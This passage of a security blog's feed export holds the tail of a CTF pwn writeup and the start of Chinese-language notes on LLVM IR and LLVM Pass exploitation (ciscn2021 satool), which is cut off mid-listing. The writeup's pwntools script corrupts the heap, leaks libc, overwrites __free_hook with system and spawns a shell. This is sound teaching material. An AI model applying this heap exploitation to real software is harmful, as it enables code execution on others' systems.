class=\"params\">idx</span>):</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;51&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&#x27;idx: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&#x27;34&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&#x27;idx: &#x27;</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">r.recv(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">heap_addr = u64(r.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"> </span><br><span class=\"line\">new_add() <span class=\"comment\">#1 0x370</span></span><br><span class=\"line\"></span><br><span class=\"line\">new_add() <span class=\"comment\">#2 0x390</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x501</span>))</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">aimed_addr = heap_addr+<span class=\"number\">0x10</span>+<span class=\"number\">0x500</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0x21</span>)*<span class=\"number\">4</span>+p64(aimed_addr))</span><br><span class=\"line\">new_add()       <span class=\"comment\">#1  0x370</span></span><br><span class=\"line\"></span><br><span class=\"line\">new_add()    <span class=\"comment\">#20x8a0</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x11</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x11</span>))</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">r.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">libcbase = u64(r.recv(<span class=\"number\">8</span>))-<span class=\"number\">0x3ec0d0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\">system = libcbase+ libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">free_hook = libcbase + libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x21</span>)+p64(free_hook))</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(system))</span><br><span class=\"line\">pause()</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "http://example.com/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "vm学习笔记",
            "date_published": "2022-06-11T11:28:16.000Z",
            "content_html": "<h1 id=\"vmlearning-笔记\"><a class=\"markdownIt-Anchor\" href=\"#vmlearning-笔记\">#</a> vmlearning 笔记</h1>\n<p>首先清楚什么是 vm，虚拟机器，一种实现不同架构的程序的解释性的软件程序。virtual machine</p>\n<p>关于 vmpass 这种解释性的程序，工作原理是根据不同的 cou 架构，不同的程序会生成不同的机器语言代码，指令代码。这个中间文件称作 IR，一般有两种形式 ——bitcode, 二进制机器码，以及.ll 文件，后者是为了方便我们阅读的，可读性较高。</p>\n<p>vmpass 程序，对于我们提供的想要模拟运行的代码，我们需要提供类似于指令代码程序的文件，.ll 或者 bc 文件，而文件是被 assmebly 后的，所以里面会有相关的汇编指令（机器代码指令）的二进制代码。那么我们知道对于一台机器，其所能实现的操作是固定的，不同的编程语言，程序，最终都会被解释为一条条的机器指令，利用组成原理的知识，一条机器指令代码，需要有操作码以及操作数，有的时候需要寄存器，而且程序的运行必然会利用到一些判断标志，c,z 等等。这些都会被形象的存储在数组中。比如寄存器数组就会对应不同的寄存器，里面记录数据，提供’cpu’使用。而字符串也会被拆开，每个字符变为 16 进制数储存。（小端序，倒着看的字符串）</p>\n<p>0x72306F446B633442LL  ===&gt;&gt; ‘r0oDkc4B’   ===&gt;&gt;“B4ckD0or”</p>\n<p>关于 vm 的机制，后面再慢慢学习。</p>\n<h2 id=\"ir代码\"><a class=\"markdownIt-Anchor\" href=\"#ir代码\">#</a> IR 代码</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MjA2MTA1L2FydGljbGUvZGV0YWlscy8xMTUyNzQyNDE/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjU0OTYwODk0MTY3ODE2ODM5MjIwNzclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPTE2NTQ5NjA4OTQxNjc4MTY4MzkyMjA3NyZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTE1Mjc0MjQxLW51bGwtbnVsbC4xNDIlNUV2MTMlNUVjb250cm9sLDE1NyU1RXYxNCU1RWNvbnRyb2wmYW1wO3V0bV90ZXJtPUlSJUU1JUI4JUI4JUU4JUE3JTgxJUU3JTlBJTg0JUU2JTkzJThEJUU0JUJEJTlDJUU2JThDJTg3JUU0JUJCJUE0JmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==\">参考资料</span></p>\n<p>IR 是一种中间产物，看了一理解位是对程序代码的指令化解析，而且适用于我们可以看懂的，可以理解位 llvm 下的汇编代码。bitcode 是纯二进制代码文件。</p>\n<p>简单的学习下</p>\n<p>源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a= <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b=<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c = a;</span><br><span class=\"line\">\t<span class=\"type\">int</span> d=<span class=\"number\">1</span>+a;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>IR 代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">; ModuleID = <span class=\"string\">&#x27;test.c&#x27;</span></span><br><span class=\"line\">source_filename = <span class=\"string\">&quot;test.c&quot;</span></span><br><span class=\"line\">target datalayout = <span class=\"string\">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class=\"line\">target triple = <span class=\"string\">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class=\"line\">define i32 @main() <span class=\"comment\">#0 &#123;</span></span><br><span class=\"line\">  %<span class=\"number\">1</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">2</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">3</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">4</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 <span class=\"number\">2</span>, i32* %<span class=\"number\">1</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 <span class=\"number\">3</span>, i32* %<span class=\"number\">2</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">5</span> = load i32, i32* %<span class=\"number\">1</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 %<span class=\"number\">5</span>, i32* %<span class=\"number\">3</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">6</span> = load i32, i32* %<span class=\"number\">1</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">7</span> = add nsw i32 <span class=\"number\">1</span>, %<span class=\"number\">6</span></span><br><span class=\"line\">  store i32 %<span class=\"number\">7</span>, i32* %<span class=\"number\">4</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  ret i32 <span class=\"number\">0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">attributes <span class=\"comment\">#0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">!llvm.module.flags = !&#123;!<span class=\"number\">0</span>&#125;</span><br><span class=\"line\">!llvm.ident = !&#123;!<span class=\"number\">1</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">!<span class=\"number\">0</span> = !&#123;i32 <span class=\"number\">1</span>, !<span class=\"string\">&quot;wchar_size&quot;</span>, i32 <span class=\"number\">4</span>&#125;</span><br><span class=\"line\">!<span class=\"number\">1</span> = !&#123;!<span class=\"string\">&quot;clang version 6.0.0-1ubuntu2 (tags/RELEASE_600/final)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>\n<p>我们重点关注函数部分。开头是文件的一些信息，文件名，类型，等等。</p>\n<p>函数，define 定义一个函数，接着 i32 表示函数的返回值是 32 位的（这里我们定义的是 int）。alloca 大概就是谁年轻一个变量的空间。变量用数字做标识，按照先后顺序。% 加上一个数字就表示的是第几个变量，同样的 i32 说明变量是 32 位。align 则是说明变量在内存中 4 字节对齐。</p>\n<p>我们知道函数名在程序内存中是一个全局的符号，我们如何表示？@用于表示全局的标识，包括函数名以及全局变量。特别说明，区别函数与变量的方法是二者的定义形式不一样。函数使用 define 关键字。</p>\n<p>% 除了用于标识局部变量还用于标识寄存器。</p>\n<p>（后续继续补充）</p>\n<p>** 关于是否需要完全掌握 IR，其实还是需要根据本题目，有的题目需要对 IR 进行优化，从而达到对源代码程序的优化。</p>\n<p>​\t\t\t有的题目和 IR 代码高度相关的那就得看懂吧！\t\t\t\t\t\t\t\t\t\t\t\t\t——ayaka</p>\n<h2 id=\"ctf\"><a class=\"markdownIt-Anchor\" href=\"#ctf\">#</a> ctf</h2>\n<p>直接进入解题，vmpass 提供用户一整套完整的流程，包括库，vmpass 基于 c++ 编写。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/Pass.h&quot;</span><span class=\"comment\">//写Pass所必须的库</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/IR/Function.h&quot;</span><span class=\"comment\">//操作函数所必须的库</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/Support/raw_ostream.h&quot;</span><span class=\"comment\">//打印输出所必须的库</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>程序中我们需要注册一些相关的内容，opt 操作，以及 clang 所需要的对象。</p>\n<h2 id=\"ciscn2021-satool\"><a class=\"markdownIt-Anchor\" href=\"#ciscn2021-satool\">#</a> ciscn2021 satool</h2>\n<p>一般来说 LLVM PASS pwn 都是对函数进行 PASS 操作，所以我们首先要找到 runOnFunction 函数时如何重写的，一般来说 runOnFunction 都会在函数表最下面。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D20                 ;org <span class=\"number\">203</span>D20h</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D20 ; `vtable <span class=\"keyword\">for</span><span class=\"number\">&#x27;</span>`anonymous namespace<span class=\"number\">&#x27;</span>::SAPass</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D20 _ZTVN12_GLOBAL__N_16SAPassE dq <span class=\"number\">0</span>        ; offset to this</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D28                 dq offset _ZTIN12_GLOBAL__N_16SAPassE ; `typeinfo <span class=\"keyword\">for</span><span class=\"number\">&#x27;</span>`anonymous namespace<span class=\"number\">&#x27;</span>::SAPass</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D30 off_203D30      dq offset _ZN4llvm4PassD2Ev</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D30                                         ; DATA XREF: sub_1930+<span class=\"number\">32</span>↑o</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D30                                         ; llvm::Pass::~Pass()</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D38                 dq offset sub_1990</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D40                 dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D48                 dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D50                 dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D58                 dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module <span class=\"type\">const</span>*)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D60                 dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,<span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"type\">char</span>&gt;&gt; <span class=\"type\">const</span>&amp;)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D68                 dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D70                 dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D78                 dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D80                 dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D88                 dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D90                 dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(<span class=\"type\">void</span> <span class=\"type\">const</span>*)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D98                 dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DA0                 dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DA8                 dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DB0                 dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DB8                 dq offset runonfunction\t\t<span class=\"comment\">//这里我进行了重命名</span></span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DC0 ; public `anonymous namespace<span class=\"number\">&#x27;</span>::SAPass</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DC0 ; `typeinfo <span class=\"keyword\">for</span><span class=\"number\">&#x27;</span>`anonymous namespace<span class=\"number\">&#x27;</span>::SAPass</span><br></pre></td></tr></table></figure>\n<p>再程序的开始 start 会有一些函数名注册，一般不需要搭理。我们重点关注的还是程序如何解释运行程序 ——runOnFunction</p>\n<p>函数里面最开始一定是 getname, 这个就是获取函数名称的，没有什么意义。</p>\n<p>如何调试？</p>\n<p>_一般情况下，题目会指定使用的 opt 加载，或者给出，这道题使用的 opt-8，对应的是 llvm-8。要提一句的是，不同的题目需要的 llvm 版本不同，需要切换，ubuntu18 最高支持的是 llvm-10。接着，我们如何确定断点？我们分析的是 pass.so 的文件，所以如果想断点，就是 offset+vmpass.so 的第一个地址。_但是程序并不是一开始就会加载 pass.so，但是地址应该是有相对固定的偏移，距离 libtinfo.so.5.9 偏移是固定的，就是其低 2 字节。解决办法，利用 compare 函数来定位，compare 会先比较 B4ckD0or，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1wYXNzLWtmNWY0c2UyZzU3Z3ozems2ZDN4MWE5ZTJlYmwzYnViYi5zbw==\">这个时候就已经加载了 pass.so</span>。</p>\n<p>回到题目，llvmpass pwn 的一个非常重要的电视，因为属于软件思想模拟一个 cpu 架构，所以每次对于我们提供的代码的操作都是种循环。而且因为是 c++ 编写的 so 库，往往会有很多不重要的检查，这些往往是很好辨认的，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">        <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)<span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"type\">char</span>&gt;&gt;::compare(</span><br><span class=\"line\">                              &amp;v89,</span><br><span class=\"line\">                              <span class=\"string\">&quot;save&quot;</span>) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v17 = *((_BYTE *)v8 + <span class=\"number\">16</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( v17 == <span class=\"number\">79</span> )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            v18 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v17 != <span class=\"number\">29</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                v16);</span><br><span class=\"line\">LABEL_139:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                v36);</span><br><span class=\"line\">LABEL_140:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid 